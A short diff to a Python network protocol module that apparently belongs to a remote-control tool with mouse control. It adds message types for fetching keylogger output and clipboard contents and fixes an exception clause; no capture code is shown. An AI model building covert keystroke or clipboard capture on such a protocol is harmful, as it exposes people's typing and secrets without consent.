@@ -31,6 +31,9 @@ class NetTypes(Enum):
     NetMouseMoveAction = 19
     NetMouseClickDownAction = 20
     NetMouseClickUpAction = 21
+    NetGetKeylogger = 22
+    NetGetClipboard = 23
+    NetText = 24
 
 class NetStatusTypes(Enum):
     NetOK = 0
@@ -67,6 +70,9 @@ class NetErrorStyling(NetItemStyling):
     icon = None
     color = "#e80c25"
 
+@dataclasses.dataclass
+class NetText(NetDataStructure):
+    text: str
 
 @dataclasses.dataclass
 class NetDirectoryItem:
@@ -203,7 +209,7 @@ class NetProtocol:
             size = socket.recv(4)
             size = struct.unpack(">I", size)[0]
             logging.debug("Unpacked message size: %s" % size)
-        except ConnectionError or struct.error:
+        except (ConnectionError, struct.error):
             return -1, -1
         else:
             if size:
